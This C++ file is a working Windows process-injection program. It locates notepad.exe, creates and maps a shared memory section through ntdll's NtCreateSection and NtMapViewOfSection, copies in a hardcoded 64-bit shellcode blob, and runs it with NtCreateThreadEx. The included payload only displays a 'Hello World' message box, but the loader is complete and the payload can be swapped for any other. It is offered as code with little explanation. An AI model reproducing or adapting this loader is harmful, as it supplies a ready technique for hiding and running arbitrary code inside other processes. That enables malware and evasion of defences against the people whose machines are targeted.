#include <iostream>
#include <stdlib.h>
#include <windows.h>
#include <tlhelp32.h>
#include <string>
#include "ntbasic.h" //https://processhacker.sourceforge.io/doc/ntbasic_8h_source.html

// MessageBox shellcode - 64-bit (exitfunc = thread)
//         - >> Hello World ! <<
//              UNENCRYPTED
unsigned char shellcode[] =
"\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
"\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
"\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
"\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
"\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
"\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
"\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
"\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
"\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
"\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
"\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
"\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
"\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
"\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
"\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
"\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
"\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
"\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
"\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
"\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
"\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
"\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
"\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
"\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
"\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
"\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
"\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
"\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
"\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";

SIZE_T scSize = sizeof(shellcode);

// https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwcreatesection
// https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtCreateSection.html
typedef NTSTATUS(NTAPI* NtCreateSection_s)(
    OUT PHANDLE SectionHandle,
    IN ULONG DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN PLARGE_INTEGER MaximumSize OPTIONAL,
    IN ULONG PageAttributess,
    IN ULONG SectionAttributes,
    IN HANDLE FileHandle OPTIONAL
    );

// https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwmapviewofsection
// https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtMapViewOfSection.html
typedef NTSTATUS(NTAPI* NtMapViewOfSection_s)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    DWORD InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect
    );


// http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/Executable%20Images/RtlCreateUserThread.html
typedef NTSTATUS(NTAPI* NtCreateThreadEx_s)(
    OUT PHANDLE hThread,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes,
    IN HANDLE ProcessHandle,
    IN PVOID lpStartAddress,
    IN PVOID lpParameter,
    IN ULONG Flags,
    IN SIZE_T StackZeroBits,
    IN SIZE_T SizeOfStackCommit,
    IN SIZE_T SizeOfStackReserve,
    OUT PVOID lpBytesBuffer
    );

// http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FSECTION_INHERIT.html
typedef enum _SECTION_INHERIT {
    ViewShare = 1,
    ViewUnmap = 2
} SECTION_INHERIT, * PSECTION_INHERIT;

// ------------------------------------------------------------------------------------------------------------------------

// https://stackoverflow.com/a/55030118
DWORD FindProcessId(const std::wstring& processName)
{
    PROCESSENTRY32 processInfo;
    processInfo.dwSize = sizeof(processInfo);
    DWORD pid = 0;


    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (processesSnapshot == INVALID_HANDLE_VALUE) return 0;

    Process32First(processesSnapshot, &processInfo);
    if (!processName.compare(processInfo.szExeFile))
    {
        CloseHandle(processesSnapshot);
        pid = processInfo.th32ProcessID;
    }

    while (Process32Next(processesSnapshot, &processInfo))
    {
        if (!processName.compare(processInfo.szExeFile))
        {
            CloseHandle(processesSnapshot);
            pid = processInfo.th32ProcessID;
        }
    }

    CloseHandle(processesSnapshot);
    return pid;
}

DWORD FindThread(DWORD pid) {

    // Init THREADENTRY structure and get size of it
    THREADENTRY32 threadInfo;
    threadInfo.dwSize = sizeof(threadInfo);

    // Handles and thread id vars
    HANDLE thSnap;

    DWORD thID = NULL;
    HANDLE tHandle = NULL;

    // Take snapshot of threads
    thSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
    if (thSnap == INVALID_HANDLE_VALUE) {
        printf("[-] Snapshot of system threads failed       ->      [ %d ]\n", GetLastError());
        return 0;
    }

    // Match PID with found thread ID, break if it does
    while (Thread32Next(thSnap, &threadInfo)) {
        if (threadInfo.th32OwnerProcessID == pid) {
            thID = threadInfo.th32ThreadID;
            break;
        }
    }

    CloseHandle(thSnap);
    return thID;
}


int main() {

    HANDLE pHandle = NULL;
    HANDLE tHandle = NULL;
    HANDLE _LGCP = GetCurrentProcess();
    HANDLE sHandle; // Section creation handle init
    HANDLE hSection = NULL;

    DWORD pID = FindProcessId(L"notepad.exe");
    DWORD tID = FindThread(pID);

    PVOID lViewSection = NULL;
    PVOID rViewSection = NULL;

    //HMODULE libNT = LoadLibraryW(L"ntdll.dll");
    //GetModuleHandle(L"NTDLL.DLL")

    // create memory section
    NtCreateSection_s pNtCreateSection = (NtCreateSection_s)GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtCreateSection");
    if (pNtCreateSection == NULL) {
        printf("[-] NtCreateSection [NTDLL] Failed       ->      [ %p ] [ %d ]\n", pNtCreateSection, GetLastError());
        return -2;
    }
    printf("[*] NtCreateSection [NTDLL] Address          ->      [ %p ]\n", pNtCreateSection);

    NtMapViewOfSection_s pNtMapViewOfSection = (NtMapViewOfSection_s)GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtMapViewOfSection");
    if (pNtMapViewOfSection == NULL) {
        printf("[-] NtMapViewOfSection [NTDLL] Failed     ->      [ %p ] [ %d ]\n", pNtMapViewOfSection, GetLastError());
        return -2;
    }
    printf("[*] NtMapViewOfSection [NTDLL] Address       ->      [ %p ]\n", pNtMapViewOfSection);

    NtCreateThreadEx_s pNtCreateThreadEx = (NtCreateThreadEx_s)GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtCreateThreadEx");
    if (pNtCreateThreadEx == NULL) {
        printf("[-] NtCreateThreadEx [NTDLL] Failed      ->      [ %p ] [ %d ]\n", pNtCreateThreadEx, GetLastError());
        return -2;
    }
    printf("[*] NtCreateThreadEx [NTDLL] Address         ->      [ %p ]\n", pNtCreateThreadEx);
    printf("\n#-------------LOAD COMPONENTS-----------------#\n");

    //FreeLibrary(libNT);

    pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pID);
    if (!pHandle) {
        printf("[-] Handle to Process [ %d ] Failed !\n", pID);
        return -1;
    }

    tHandle = OpenThread(THREAD_ALL_ACCESS, FALSE, tID);
    if (!pHandle) {
        printf("[-] Handle to Thread [ %d ] Failed !\n", tID);
        return -1;
    }

    // Create Local View Section
    pNtCreateSection(&sHandle, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER)&scSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

    // Map local sectio
    pNtMapViewOfSection(sHandle, _LGCP, &lViewSection, NULL, NULL, NULL, &scSize, ViewUnmap, NULL, PAGE_READWRITE);
    printf("Local View: %p\n", lViewSection);

    // throw the payload into the section
    if (!memmove(lViewSection, shellcode, scSize)) {
        printf("Fail #3\n");
        return 0;
    }

    // Remote Map View Section
    pNtMapViewOfSection(sHandle, pHandle, &rViewSection, NULL, NULL, NULL, &scSize, ViewUnmap, NULL, PAGE_EXECUTE_READ);
    printf("Remote View: %p\n", rViewSection);

    HANDLE newThread = NULL;
    pNtCreateThreadEx(&tHandle, PROCESS_ALL_ACCESS, NULL, pHandle, (LPTHREAD_START_ROUTINE)rViewSection, NULL, NULL, 0, 0, 0, NULL);
    WaitForSingleObject(pHandle, INFINITE);
    CloseHandle(tHandle);
    CloseHandle(pHandle);
    return 0;
}